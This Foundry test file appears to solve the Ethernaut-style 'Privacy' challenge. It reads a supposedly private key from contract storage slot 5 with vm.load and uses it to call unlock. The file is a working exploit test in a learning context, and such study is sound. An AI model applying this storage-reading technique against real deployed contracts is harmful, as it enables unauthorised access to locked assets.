// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Privacy} from "../src/contracts/12_Privacy.sol";

contract PrivacyTest is Test {
    Privacy private privacy;

    function setUp() public {
        bytes32[3] memory data = [
            bytes32(
                0x1111111111111111111111111111111111111111111111111111111111111111
            ),
            bytes32(
                0x2222222222222222222222222222222222222222222222222222222222222222
            ),
            bytes32(
                0x3333333333333333333333333333333333333333333333333333333333333333
            )
        ];
        privacy = new Privacy(data);
    }

    function test_PrivacyExploitVulnerability() public {
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));

        privacy.unlock(bytes16(key));

        assertFalse(privacy.locked());
    }
}
